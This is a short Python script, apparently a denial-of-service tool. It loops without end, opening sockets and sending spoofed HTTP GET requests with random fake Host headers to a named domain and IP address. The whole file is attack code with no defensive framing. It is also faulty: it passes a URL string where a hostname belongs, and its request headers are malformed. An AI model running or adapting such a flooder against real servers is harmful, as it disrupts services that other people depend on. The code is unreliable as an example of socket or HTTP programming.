import random
import socket
from faker import Faker
import threading
fake = Faker()

ip='107.150.4.187'
target = 'https://ususbvi.top/'
attack_num=0
port = 80

def get_fake_ip():
    return f'{random.randrange(0,255)}.{random.randrange(0,255)}.{random.randrange(0,255)}.{random.randrange(0,255)}'

def attack():

    while True:
        message = ''
        message += 'GET /' + ip + ' HTTP/1.1\r\n'
        message += 'Host: ' + get_fake_ip() + '\r\n\r\n'
        message += f'User-Agent: Chrome/1.0.6 (iPhone; iOS 17.0; Scale/3.00)\r\n'
        message += '\r\n'
        print(message)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto((message).encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        if (attack_num %10==0): print(attack_num)
        s.close()

for i in range(1):
    thread = threading.Thread(target=attack)
    thread.start()